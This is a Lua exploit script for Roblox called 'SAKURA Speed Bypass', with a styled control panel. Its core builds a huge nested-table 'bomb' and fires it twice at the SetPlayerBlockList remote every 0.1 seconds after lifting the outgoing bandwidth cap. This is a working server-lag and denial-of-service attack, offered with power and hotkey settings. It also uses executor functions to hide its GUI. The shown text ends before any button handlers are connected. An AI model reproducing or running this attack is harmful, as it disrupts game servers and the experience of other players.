-- SAKURA Speed Bypass (GUI matched to reference photo)
-- Core bypass logic preserved + Hook Lagger power boost + BG selector

local Services = {
    Players = game:GetService("Players"),
    UserInput = game:GetService("UserInputService"),
    RunService = game:GetService("RunService"),
    Tween = game:GetService("TweenService"),
    Http = game:GetService("HttpService"),
    ContentProvider = game:GetService("ContentProvider"),
}

local LocalPlayer = Services.Players.LocalPlayer or Services.Players.PlayerAdded:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--=====================================================================
-- CONFIG
--=====================================================================
local CONSTANTS = {
    CONFIG_FILE = "SakuraSpeedBypass.json",
    GUI_NAME = "SakuraSpeedBypass",

    DEPTH = 296,
    SPAM_DELAY = 0.10,
    MIN_POWER = 1,
    MAX_POWER = 500000,
    -- Hook Lagger style boost
    MAX_KBPS = math.huge,
    MAX_REPS = 1800,

    DEFAULT_POWER_PC = 97000,
    DEFAULT_POWER_MOBILE = 65000,
    POWER_STEP = 1000,

    -- Same background assets as Sakura Duels (sakura.vs)
    BACKGROUND_IMAGES = {
        "118241258424065",
        "137090941888778",
        "106638406471484",
        "126843729942853",
        "132235750206658",
    },
    BG_ASSET = "118241258424065",
    DISCORD = "https://discord.gg/sakuraduels",
}

local Theme = {
    Panel = Color3.fromRGB(16, 16, 18),
    PanelInner = Color3.fromRGB(22, 22, 26),
    PanelBtn = Color3.fromRGB(28, 28, 32),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(160, 160, 165),
    Stroke = Color3.fromRGB(48, 48, 52),
    BorderGlow = Color3.fromRGB(190, 55, 40),
    Inactive = Color3.fromRGB(130, 130, 135),
}

local State = {
    enabled = false,
    powerValue = CONSTANTS.DEFAULT_POWER_PC,
    mode = "PC",
    toggleKey = Enum.KeyCode.V,
    isVisible = true,
    listeningKey = false,
    uiScale = 1,
    backgroundIndex = 1,
}

local Bypass = {
    running = false,
    bomb = nil,
    bombPower = nil,
    thread = nil,
    startedAt = 0,
}

local Refs = {}

--=====================================================================
-- CONFIG SAVE / LOAD
--=====================================================================
local function saveConfig()
    pcall(function()
        writefile(CONSTANTS.CONFIG_FILE, Services.Http:JSONEncode({
            Enabled = State.enabled,
            PowerValue = State.powerValue,
            Mode = State.mode,
            ToggleKey = State.toggleKey.Name,
            IsVisible = State.isVisible,
            UiScale = State.uiScale,
            BackgroundIndex = State.backgroundIndex,
        }))
    end)
end

local function loadConfig()
    pcall(function()
        if not isfile or not isfile(CONSTANTS.CONFIG_FILE) then return end
        local data = Services.Http:JSONDecode(readfile(CONSTANTS.CONFIG_FILE))
        if not data then return end
        State.enabled = data.Enabled == true
        State.powerValue = tonumber(data.PowerValue) or CONSTANTS.DEFAULT_POWER_PC
        State.mode = data.Mode or "PC"
        State.isVisible = data.IsVisible ~= false
        State.uiScale = math.clamp(tonumber(data.UiScale) or 1, 0.7, 1.4)
        local n = #CONSTANTS.BACKGROUND_IMAGES
        local idx = math.floor(tonumber(data.BackgroundIndex) or 1)
        if idx < 1 then idx = 1 end
        if idx > n then idx = n end
        State.backgroundIndex = idx
        CONSTANTS.BG_ASSET = CONSTANTS.BACKGROUND_IMAGES[idx]
        if data.ToggleKey and Enum.KeyCode[data.ToggleKey] then
            State.toggleKey = Enum.KeyCode[data.ToggleKey]
        end
    end)
end

--=====================================================================
-- BYPASS (Hook Lagger power blend — stronger payload + KBPS unlock)
--=====================================================================
local function buildBomb(power)
    power = math.clamp(tonumber(power) or CONSTANTS.DEFAULT_POWER_PC, CONSTANTS.MIN_POWER, CONSTANTS.MAX_POWER)
    local depth = CONSTANTS.DEPTH
    -- Nested chain (same structure as Hook Lagger)
    local chain = { {} }
    local cursor = chain[1]
    for _ = 1, depth do
        local nxt = {}
        table.insert(cursor, nxt)
        cursor = nxt
    end
    local mainTable = {}
    -- reps from power, capped like Hook Lagger (stronger ceiling)
    local reps = math.floor(power / (depth + 2))
    reps = math.clamp(reps, 1, CONSTANTS.MAX_REPS)
    for _ = 1, reps do
        table.insert(mainTable, chain)
    end
    return mainTable
end

local function getBomb(power)
    power = math.floor(tonumber(power) or State.powerValue)
    if Bypass.bomb and Bypass.bombPower == power then
        return Bypass.bomb
    end
    Bypass.bomb = buildBomb(power)
    Bypass.bombPower = power
    return Bypass.bomb
end

local function setOutgoingLimit(limit)
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(limit)
    end)
end

local function stopBypass()
    Bypass.running = false
    if Bypass.thread then pcall(task.cancel, Bypass.thread) end
    Bypass.thread = nil
    -- unlock bandwidth when stopped (Hook Lagger style)
    setOutgoingLimit(math.huge)
end

local function startBypass(power)
    stopBypass()
    Bypass.running = true
    local bomb = getBomb(power)
    Bypass.startedAt = os.clock()
    -- unlock outgoing rate so spam hits harder
    setOutgoingLimit(CONSTANTS.MAX_KBPS)
    Bypass.thread = task.spawn(function()
        local remote = nil
        pcall(function()
            remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
        end)
        while Bypass.running do
            if bomb then
                -- primary fire
                pcall(function()
                    if remote then
                        remote:FireServer(bomb)
                    else
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end
                end)
                -- Hook Lagger-style double punch on same tick (slightly stronger)
                pcall(function()
                    if remote then
                        remote:FireServer(bomb)
                    end
                end)
            end
            task.wait(CONSTANTS.SPAM_DELAY)
        end
    end)
end

local function restartBypass()
    if State.enabled then startBypass(State.powerValue) end
end

--=====================================================================
-- UI HELPERS
--=====================================================================
local function corner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 14)
    c.Parent = parent
    return c
end

local function stroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Stroke
    s.Thickness = thickness or 1.15
    s.Transparency = transparency or 0.2
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end

-- Robust image loader: tries multiple URI formats until one loads
local _imgVersion = setmetatable({}, { __mode = "k" })
local function loadAssetImage(img, assetId, opts)
    if not img then return end
    opts = opts or {}
    local id = tostring(assetId or ""):gsub("%D", "")
    if id == "" then return end

    local version = (_imgVersion[img] or 0) + 1
    _imgVersion[img] = version

    img.BackgroundTransparency = 1
    img.ImageTransparency = opts.transparency or 0
    img.ImageColor3 = opts.color or Color3.fromRGB(255, 255, 255)
    img.ScaleType = opts.scaleType or Enum.ScaleType.Crop

    local candidates = {
        "rbxassetid://" .. id,
        "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420",
        "rbxthumb://type=Asset&id=" .. id .. "&w=768&h=432",
        "rbxthumb://type=Asset&id=" .. id .. "&w=150&h=150",
        "https://www.roblox.com/asset-thumbnail/image?assetId=" .. id .. "&width=420&height=420&format=png",
        "https://thumbnails.roblox.com/v1/assets?assetIds=" .. id .. "&size=420x420&format=Png",
    }

    task.spawn(function()
        for _, uri in ipairs(candidates) do
            if not img or not img.Parent or _imgVersion[img] ~= version then return end
            img.Image = uri
            pcall(function()
                Services.ContentProvider:PreloadAsync({ img })
            end)
            task.wait(0.45)
            if not img or not img.Parent or _imgVersion[img] ~= version then return end
            local loaded = false
            pcall(function() loaded = img.IsLoaded end)
            if loaded then
                if opts.onLoaded then pcall(opts.onLoaded, true) end
                return
            end
        end
        if opts.onLoaded then pcall(opts.onLoaded, false) end
    end)
end

local function makeDraggable(handle, target)
    local dragging, dragStart, startPos = false, nil, nil
    handle.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
            and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end
        local pos = input.Position
        for _, child in ipairs(handle:GetDescendants()) do
            if child:IsA("GuiButton") and child.Visible then
                local ap, as = child.AbsolutePosition, child.AbsoluteSize
                if pos.X >= ap.X and pos.X <= ap.X + as.X
                   and pos.Y >= ap.Y and pos.Y <= ap.Y + as.Y then
                    return
                end
            end
        end
        dragging = true
        dragStart = input.Position
        startPos = target.Position
    end)
    handle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    Services.UserInput.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch then
            local d = input.Position - dragStart
            target.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end

--=====================================================================
-- BUILD GUI
--=====================================================================
local function destroyOld()
    for _, parent in ipairs({ PlayerGui, game:GetService("CoreGui") }) do
        pcall(function()
            local o = parent:FindFirstChild(CONSTANTS.GUI_NAME)
            if o then o:Destroy() end
        end)
    end
end

local function buildGui()
    destroyOld()

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = CONSTANTS.GUI_NAME
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 120
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(screenGui) end
    end)
    local ok = pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
    if not ok then screenGui.Parent = PlayerGui end

    -- Outer shell
    local outer = Instance.new("Frame")
    outer.Name = "Outer"
    outer.Size = UDim2.new(0, 352, 0, 278)
    outer.Position = UDim2.new(0.5, -176, 0.5, -139)
    outer.BackgroundTransparency = 1
    outer.BorderSizePixel = 0
    outer.Parent = screenGui

    -- Main rounded panel
    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(1, 0, 1, 0)
    main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    main.BackgroundTransparency = 0.05
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.Parent = outer
    corner(main, 20)
    local mainStroke = stroke(main, Theme.BorderGlow, 2.4, 0.22)

    -- Soft inner edge (double-border look)
    local innerEdge = Instance.new("Frame")
    innerEdge.Name = "InnerEdge"
    innerEdge.Size = UDim2.new(1, -6, 1, -6)
    innerEdge.Position = UDim2.new(0, 3, 0, 3)
    innerEdge.BackgroundTransparency = 1
    innerEdge.BorderSizePixel = 0
    innerEdge.ZIndex = 2
    innerEdge.Parent = main
    corner(innerEdge, 17)
    stroke(innerEdge, Color3.fromRGB(30, 30, 34), 1, 0.35)

    -- Background image (full bleed, cropped)
    local bg = Instance.new("ImageLabel")
    bg.Name = "Background"
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0
    bg.ScaleType = Enum.ScaleType.Crop
    bg.ImageTransparency = 0.42
    bg.ZIndex = 0
    bg.Parent = main
    corner(bg, 20)
    local bgId = CONSTANTS.BACKGROUND_IMAGES[State.backgroundIndex] or CONSTANTS.BG_ASSET
    CONSTANTS.BG_ASSET = bgId
    loadAssetImage(bg, bgId, { transparency = 0.42, scaleType = Enum.ScaleType.Crop })
    Refs.bgImage = bg

    -- Dark gradient wash for readability
    local wash = Instance.new("Frame")
    wash.Size = UDim2.new(1, 0, 1, 0)
    wash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    wash.BackgroundTransparency = 0.38
    wash.BorderSizePixel = 0
    wash.ZIndex = 1
    wash.Parent = main
    corner(wash, 20)

    local content = Instance.new("Frame")
    content.Name = "Content"
    content.Size = UDim2.new(1, -28, 1, -28)
    content.Position = UDim2.new(0, 14, 0, 14)
    content.BackgroundTransparency = 1
    content.ZIndex = 5
    content.Parent = main

    ----------------------------------------------------------------
    -- HEADER
    ----------------------------------------------------------------
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 82)
    header.BackgroundColor3 = Theme.Panel
    header.BackgroundTransparency = 0.18
    header.BorderSizePixel = 0
    header.ZIndex = 6
    header.Parent = content
    corner(header, 16)
    stroke(header, Theme.Stroke, 1.15, 0.28)

    local titleText = Instance.new("TextLabel")
    titleText.Name = "SakuraTitle"
    titleText.Size = UDim2.new(0, 200, 0, 46)
    titleText.Position = UDim2.new(0, 14, 0, 6)
    titleText.BackgroundTransparency = 1
    titleText.Text = "SAKURA"
    titleText.Font = Enum.Font.GothamBlack
    titleText.TextSize = 34
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.TextYAlignment = Enum.TextYAlignment.Center
    titleText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    titleText.TextStrokeTransparency = 0.4
    titleText.ZIndex = 8
    titleText.Parent = header

    local titleGrad = Instance.new("UIGradient")
    titleGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(245, 245, 250)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 210, 220)),
    })
    titleGrad.Parent = titleText

    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "Discord"
    discordLbl.Size = UDim2.new(0, 190, 0, 18)
    discordLbl.Position = UDim2.new(0, 16, 0, 52)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = CONSTANTS.DISCORD
    discordLbl.Font = Enum.Font.Gotham
    discordLbl.TextSize = 11
    discordLbl.TextColor3 = Theme.TextDim
    discordLbl.TextXAlignment = Enum.TextXAlignment.Left
    discordLbl.ZIndex = 8
    discordLbl.Parent = header

    -- Mode pill (PC / MOBILE)
    local modeBox = Instance.new("Frame")
    modeBox.Name = "ModeBox"
    modeBox.Size = UDim2.new(0, 138, 0, 36)
    modeBox.Position = UDim2.new(1, -154, 0, 36)
    modeBox.BackgroundColor3 = Theme.PanelInner
    modeBox.BackgroundTransparency = 0.08
    modeBox.BorderSizePixel = 0
    modeBox.ZIndex = 8
    modeBox.Parent = header
    corner(modeBox, 12)
    stroke(modeBox, Theme.Stroke, 1.1, 0.3)

    local pcBtn = Instance.new("TextButton")
    pcBtn.Name = "PC"
    pcBtn.Size = UDim2.new(0.5, -5, 1, -8)
    pcBtn.Position = UDim2.new(0, 4, 0, 4)
    pcBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    pcBtn.BackgroundTransparency = 0.08
    pcBtn.BorderSizePixel = 0
    pcBtn.Text = "PC"
    pcBtn.Font = Enum.Font.GothamBold
    pcBtn.TextSize = 12
    pcBtn.TextColor3 = Color3.fromRGB(12, 12, 14)
    pcBtn.AutoButtonColor = false
    pcBtn.ZIndex = 9
    pcBtn.Parent = modeBox
    corner(pcBtn, 9)

    local mobileBtn = Instance.new("TextButton")
    mobileBtn.Name = "Mobile"
    mobileBtn.Size = UDim2.new(0.5, -5, 1, -8)
    mobileBtn.Position = UDim2.new(0.5, 1, 0, 4)
    mobileBtn.BackgroundColor3 = Theme.PanelBtn
    mobileBtn.BackgroundTransparency = 1
    mobileBtn.BorderSizePixel = 0
    mobileBtn.Text = "MOBILE"
    mobileBtn.Font = Enum.Font.GothamBold
    mobileBtn.TextSize = 11
    mobileBtn.TextColor3 = Theme.Inactive
    mobileBtn.AutoButtonColor = false
    mobileBtn.ZIndex = 9
    mobileBtn.Parent = modeBox
    corner(mobileBtn, 9)

    ----------------------------------------------------------------
    -- TOP CONTROLS: < > scale + minimize
    ----------------------------------------------------------------
    local topControls = Instance.new("Frame")
    topControls.Name = "TopControls"
    topControls.Size = UDim2.new(0, 100, 0, 28)
    topControls.Position = UDim2.new(1, -108, 0, 8)
    topControls.BackgroundTransparency = 1
    topControls.BorderSizePixel = 0
    topControls.ZIndex = 50
    topControls.Parent = content

    local function makeCtrlBtn(name, label, x)
        local b = Instance.new("TextButton")
        b.Name = name
        b.Size = UDim2.new(0, 30, 0, 28)
        b.Position = UDim2.new(0, x, 0, 0)
        b.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
        b.BackgroundTransparency = 0.05
        b.BorderSizePixel = 0
        b.Text = label
        b.Font = Enum.Font.GothamBold
        b.TextSize = 16
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        b.AutoButtonColor = true
        b.Active = true
        b.Selectable = true
        b.ZIndex = 55
        b.Parent = topControls
        corner(b, 8)
        stroke(b, Color3.fromRGB(70, 70, 75), 1.2, 0.2)
        return b
    end

    local scaleDownBtn = makeCtrlBtn("ScaleDown", "<", 0)
    local scaleUpBtn = makeCtrlBtn("ScaleUp", ">", 34)
    local minBtn = makeCtrlBtn("Minimize", "—", 68)

    local function applyScale(newScale)
        State.uiScale = math.clamp(math.floor((newScale) * 10 + 0.5) / 10, 0.7, 1.4)
        if Refs.uiScaleObj then
            Refs.uiScaleObj.Scale = State.uiScale
        elseif outer then
            local s = outer:FindFirstChild("MainUIScale")
            if not s then
                s = Instance.new("UIScale")
                s.Name = "MainUIScale"
                s.Parent = outer
            end
            s.Scale = State.uiScale
            Refs.uiScaleObj = s
        end
        pcall(saveConfig)
        print("[SAKURA] UI scale =", State.uiScale)
    end

    scaleDownBtn.Activated:Connect(function()
        applyScale((State.uiScale or 1) - 0.1)
    end)
    scaleUpBtn.Activated:Connect(function()
        applyScale((State.uiScale or 1) + 0.1)
    end)

    local powerCardRef, keyCardRef
    local function toggleMinimize()
        State.isVisible = not State.isVisible
        local vis = State.isVisible
        local pc = powerCardRef or (Refs and Refs.powerCard)
        local kc = keyCardRef or (Refs and Refs.keyCard)
        if pc then pc.Visible = vis end
        if kc then kc.Visible = vis end
        if outer then
            if vis then
                outer.Size = UDim2.new(0, 352, 0, 278)
            else
                outer.Size = UDim2.new(0, 352, 0, 110)
            end
        end
        minBtn.Text = vis and "—" or "+"
        pcall(saveConfig)
        print("[SAKURA] minimized =", not vis)
    end
    minBtn.Activated:Connect(toggleMinimize)

    ----------------------------------------------------------------
    -- POWER CARD
    ----------------------------------------------------------------
    local powerCard = Instance.new("Frame")
    powerCard.Name = "PowerCard"
    powerCard.Size = UDim2.new(1, 0, 0, 92)
    powerCard.Position = UDim2.new(0, 0, 0, 94)
    powerCard.BackgroundColor3 = Theme.Panel
    powerCard.BackgroundTransparency = 0.18
    powerCard.BorderSizePixel = 0
    powerCard.ZIndex = 6
    powerCard.Parent = content
    corner(powerCard, 16)
    stroke(powerCard, Theme.Stroke, 1.15, 0.28)

    local powerTitle = Instance.new("TextLabel")
    powerTitle.Size = UDim2.new(0, 58, 0, 22)
    powerTitle.Position = UDim2.new(0, 16, 0, 10)
    powerTitle.BackgroundTransparency = 1
    powerTitle.Text = "POWER:"
    powerTitle.Font = Enum.Font.GothamBold
    powerTitle.TextSize = 13
    powerTitle.TextColor3 = Theme.Text
    powerTitle.TextXAlignment = Enum.TextXAlignment.Left
    powerTitle.ZIndex = 7
    powerTitle.Parent = powerCard

    -- Background selector next to POWER
    local bgBox = Instance.new("Frame")
    bgBox.Name = "BgBox"
    bgBox.Size = UDim2.new(0, 118, 0, 24)
    bgBox.Position = UDim2.new(0, 78, 0, 9)
    bgBox.BackgroundColor3 = Theme.PanelInner
    bgBox.BackgroundTransparency = 0.08
    bgBox.BorderSizePixel = 0
    bgBox.ZIndex = 8
    bgBox.Parent = powerCard
    corner(bgBox, 10)
    stroke(bgBox, Theme.Stroke, 1, 0.35)

    local bgDownBtn = Instance.new("TextButton")
    bgDownBtn.Name = "BgDown"
    bgDownBtn.Size = UDim2.new(0, 26, 1, -4)
    bgDownBtn.Position = UDim2.new(0, 2, 0, 2)
    bgDownBtn.BackgroundColor3 = Theme.PanelBtn
    bgDownBtn.BackgroundTransparency = 0.15
    bgDownBtn.BorderSizePixel = 0
    bgDownBtn.Text = "<"
    bgDownBtn.Font = Enum.Font.GothamBold
    bgDownBtn.TextSize = 13
    bgDownBtn.TextColor3 = Theme.Text
    bgDownBtn.AutoButtonColor = true
    bgDownBtn.ZIndex = 9
    bgDownBtn.Parent = bgBox
    corner(bgDownBtn, 7)

    local bgLabel = Instance.new("TextLabel")
    bgLabel.Name = "BgLabel"
    bgLabel.Size = UDim2.new(1, -56, 1, 0)
    bgLabel.Position = UDim2.new(0, 28, 0, 0)
    bgLabel.BackgroundTransparency = 1
    bgLabel.Text = "BG " .. tostring(State.backgroundIndex)
    bgLabel.Font = Enum.Font.GothamBold
    bgLabel.TextSize = 11
    bgLabel.TextColor3 = Theme.Text
    bgLabel.TextXAlignment = Enum.TextXAlignment.Center
    bgLabel.ZIndex = 9
    bgLabel.Parent = bgBox

    local bgUpBtn = Instance.new("TextButton")
    bgUpBtn.Name = "BgUp"
    bgUpBtn.Size = UDim2.new(0, 26, 1, -4)
    bgUpBtn.Position = UDim2.new(1, -28, 0, 2)
    bgUpBtn.BackgroundColor3 = Theme.PanelBtn
    bgUpBtn.BackgroundTransparency = 0.15
    bgUpBtn.BorderSizePixel = 0
    bgUpBtn.Text = ">"
    bgUpBtn.Font = Enum.Font.GothamBold
    bgUpBtn.TextSize = 13
    bgUpBtn.TextColor3 = Theme.Text
    bgUpBtn.AutoButtonColor = true
    bgUpBtn.ZIndex = 9
    bgUpBtn.Parent = bgBox
    corner(bgUpBtn, 7)

    local statusPill = Instance.new("TextButton")
    statusPill.Name = "Status"
    statusPill.Size = UDim2.new(0, 88, 0, 24)
    statusPill.Position = UDim2.new(1, -100, 0, 9)
    statusPill.BackgroundColor3 = Theme.PanelBtn
    statusPill.BackgroundTransparency = 0.12
    statusPill.BorderSizePixel = 0
    statusPill.Text = "DISABLED"
    statusPill.Font = Enum.Font.GothamBold
    statusPill.TextSize = 11
    statusPill.TextColor3 = Theme.TextDim
    statusPill.AutoButtonColor = false
    statusPill.ZIndex = 8
    statusPill.Parent = powerCard
    corner(statusPill, 10)
    stroke(statusPill, Theme.Stroke, 1, 0.35)

    local controls = Instance.new("Frame")
    controls.Size = UDim2.new(1, -24, 0, 42)
    controls.Position = UDim2.new(0, 12, 0, 40)
    controls.BackgroundTransparency = 1
    controls.ZIndex = 7
    controls.Parent = powerCard

    local leftBtn = Instance.new("TextButton")
    leftBtn.Name = "PowerDown"
    leftBtn.Size = UDim2.new(0, 42, 0, 42)
    leftBtn.BackgroundColor3 = Theme.PanelInner
    leftBtn.BackgroundTransparency = 0.05
    leftBtn.BorderSizePixel = 0
    leftBtn.Text = "◀"
    leftBtn.Font = Enum.Font.GothamBold
    leftBtn.TextSize = 15
    leftBtn.TextColor3 = Theme.Text
    leftBtn.AutoButtonColor = false
    leftBtn.ZIndex = 8
    leftBtn.Parent = controls
    corner(leftBtn, 12)
    stroke(leftBtn, Theme.Stroke, 1.05, 0.3)

    local powerBox = Instance.new("TextBox")
    powerBox.Name = "PowerValue"
    powerBox.Size = UDim2.new(1, -104, 0, 42)
    powerBox.Position = UDim2.new(0, 52, 0, 0)
    powerBox.BackgroundColor3 = Theme.PanelInner
    powerBox.BackgroundTransparency = 0.05
    powerBox.BorderSizePixel = 0
    powerBox.Text = tostring(State.powerValue)
    powerBox.Font = Enum.Font.GothamBlack
    powerBox.TextSize = 22
    powerBox.TextColor3 = Theme.Text
    powerBox.ClearTextOnFocus = false
    powerBox.TextXAlignment = Enum.TextXAlignment.Center
    powerBox.ZIndex = 8
    powerBox.Parent = controls
    corner(powerBox, 12)
    stroke(powerBox, Theme.Stroke, 1.05, 0.3)

    local rightBtn = Instance.new("TextButton")
    rightBtn.Name = "PowerUp"
    rightBtn.Size = UDim2.new(0, 42, 0, 42)
    rightBtn.Position = UDim2.new(1, -42, 0, 0)
    rightBtn.BackgroundColor3 = Theme.PanelInner
    rightBtn.BackgroundTransparency = 0.05
    rightBtn.BorderSizePixel = 0
    rightBtn.Text = "▶"
    rightBtn.Font = Enum.Font.GothamBold
    rightBtn.TextSize = 15
    rightBtn.TextColor3 = Theme.Text
    rightBtn.AutoButtonColor = false
    rightBtn.ZIndex = 8
    rightBtn.Parent = controls
    corner(rightBtn, 12)
    stroke(rightBtn, Theme.Stroke, 1.05, 0.3)

    ----------------------------------------------------------------
    -- HOTKEY CARD
    ----------------------------------------------------------------
    local keyCard = Instance.new("Frame")
    keyCard.Name = "HotkeyCard"
    keyCard.Size = UDim2.new(1, 0, 0, 54)
    keyCard.Position = UDim2.new(0, 0, 0, 198)
    keyCard.BackgroundColor3 = Theme.Panel
    keyCard.BackgroundTransparency = 0.18
    keyCard.BorderSizePixel = 0
    keyCard.ZIndex = 6
    keyCard.Parent = content
    corner(keyCard, 16)
    stroke(keyCard, Theme.Stroke, 1.15, 0.28)

    local keyLabel = Instance.new("TextLabel")
    keyLabel.Size = UDim2.new(0.55, 0, 1, 0)
    keyLabel.Position = UDim2.new(0, 18, 0, 0)
    keyLabel.BackgroundTransparency = 1
    keyLabel.Text = "Hotkey"
    keyLabel.Font = Enum.Font.GothamBold
    keyLabel.TextSize = 15
    keyLabel.TextColor3 = Theme.Text
    keyLabel.TextXAlignment = Enum.TextXAlignment.Left
    keyLabel.ZIndex = 7
    keyLabel.Parent = keyCard

    local keyBtn = Instance.new("TextButton")
    keyBtn.Name = "HotkeyBtn"
    keyBtn.Size = UDim2.new(0, 54, 0, 34)
    keyBtn.Position = UDim2.new(1, -68, 0.5, -17)
    keyBtn.BackgroundColor3 = Theme.PanelInner
    keyBtn.BackgroundTransparency = 0.05
    keyBtn.BorderSizePixel = 0
    keyBtn.Text = State.toggleKey.Name
    keyBtn.Font = Enum.Font.GothamBold
    keyBtn.TextSize = 14
    keyBtn.TextColor3 = Theme.Text
    keyBtn.AutoButtonColor = false
    keyBtn.ZIndex = 8
    keyBtn.Parent = keyCard
    corner(keyBtn, 11)
    stroke(keyBtn, Theme.Stroke, 1.05, 0.3)

    powerCardRef = powerCard
    keyCardRef = keyCard

    Refs = {
        screenGui = screenGui,
        outer = outer,
        main = main,
        mainStroke = mainStroke,
        content = content,
        header = header,
        powerCard = powerCard,
        keyCard = keyCard,
        pcBtn = pcBtn,
        mobileBtn = mobileBtn,
        statusPill = statusPill,
        powerBox = powerBox,
        leftBtn = leftBtn,
        rightBtn = rightBtn,
        keyBtn = keyBtn,
        minBtn = minBtn,
        scaleDownBtn = scaleDownBtn,
        scaleUpBtn = scaleUpBtn,
        titleText = titleText,
        bgLabel = bgLabel,
        bgDownBtn = bgDownBtn,
        bgUpBtn = bgUpBtn,
        bgImage = Refs.bgImage or bg,
        fullSize = UDim2.new(0, 352, 0, 278),
        miniSize = UDim2.new(0, 352, 0, 110),
    }

    local uiScaleObj = Instance.new("UIScale")
    uiScaleObj.Name = "MainUIScale"
    uiScaleObj.Scale = State.uiScale or 1
    uiScaleObj.Parent = outer
    Refs.uiScaleObj = uiScaleObj

    makeDraggable(header, outer)
    makeDraggable(main, outer)
end

--=====================================================================
-- REFRESH
--=====================================================================
local function refreshMode()
    local pc, mb = Refs.pcBtn, Refs.mobileBtn
    if not pc then return end
    if State.mode == "PC" then
        pc.BackgroundTransparency = 0.08
        pc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        pc.TextColor3 = Color3.fromRGB(12, 12, 14)
        mb.BackgroundTransparency = 1
        mb.TextColor3 = Theme.Inactive
    else
        mb.BackgroundTransparency = 0.08
        mb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        mb.TextColor3 = Color3.fromRGB(12, 12, 14)
        pc.BackgroundTransparency = 1
        pc.TextColor3 = Theme.Inactive
    end
end

local function refreshStatus()
    local pill = Refs.statusPill
    if not pill then return end
    if State.enabled then
        pill.Text = "ENABLED"
        pill.TextColor3 = Color3.fromRGB(90, 255, 150)
        if Refs.mainStroke then Refs.mainStroke.Color = Color3.fromRGB(55, 190, 100) end
    else
        pill.Text = "DISABLED"
        pill.TextColor3 = Theme.TextDim
        if Refs.mainStroke then Refs.mainStroke.Color = Theme.BorderGlow end
    end
end

local function refreshPower()
    if Refs.powerBox then Refs.powerBox.Text = tostring(State.powerValue) end
end

local function refreshBackground()
    local n = #CONSTANTS.BACKGROUND_IMAGES
    local idx = math.clamp(math.floor(tonumber(State.backgroundIndex) or 1), 1, n)
    State.backgroundIndex = idx
    local id = CONSTANTS.BACKGROUND_IMAGES[idx]
    CONSTANTS.BG_ASSET = id
    if Refs.bgLabel then
        Refs.bgLabel.Text = "BG " .. tostring(idx)
    end
    if Refs.bgImage then
        loadAssetImage(Refs.bgImage, id, { transparency = 0.42, scaleType = Enum.ScaleType.Crop })
    end
end

local function setBackgroundIndex(dir)
    local n = #CONSTANTS.BACKGROUND_IMAGES
    local idx = (State.backgroundIndex or 1) + (dir or 0)
    if idx < 1 then idx = n end
    if idx > n then idx = 1 end
    State.backgroundIndex = idx
    refreshBackground()
    saveConfig()
end

local function refreshKey()
    if Refs.keyBtn then
        Refs.keyBtn.Text = State.toggleKey.Name
        Refs.keyBtn.TextColor3 = Theme.Text
    end
end

local function refreshVisibility()
    local v = State.isVisible == true
    State.isVisible = v
    if Refs.powerCard then Refs.powerCard.Visible = v end
    if Refs.keyCard then Refs.keyCard.Visible = v end
    if Refs.outer then
        Refs.outer.Size = v and (Refs.fullSize or UDim2.new(0, 352, 0, 278))
            or (Refs.miniSize or UDim2.new(0, 352, 0, 110))
    end
    if Refs.minBtn then Refs.minBtn.Text = v and "—" or "+" end
end

local function refreshUIScale()
    State.uiScale = math.clamp(tonumber(State.uiScale) or 1, 0.7, 1.4)
    if Refs.uiScaleObj then
        Refs.uiScaleObj.Scale = State.uiScale
    end
end

local function setPower(val)
    val = math.clamp(math.floor(tonumber(val) or State.powerValue), CONSTANTS.MIN_POWER, CONSTANTS.MAX_POWER)
    State.powerValue = val
    refreshPower()
    restartBypass()
    saveConfig()
end

local function toggleEnabled()
    State.enabled = not State.enabled
    refreshStatus()
    if State.enabled then startBypass(State.powerValue) else stopBypass() end
    saveConfig()
end

--=====================================================================
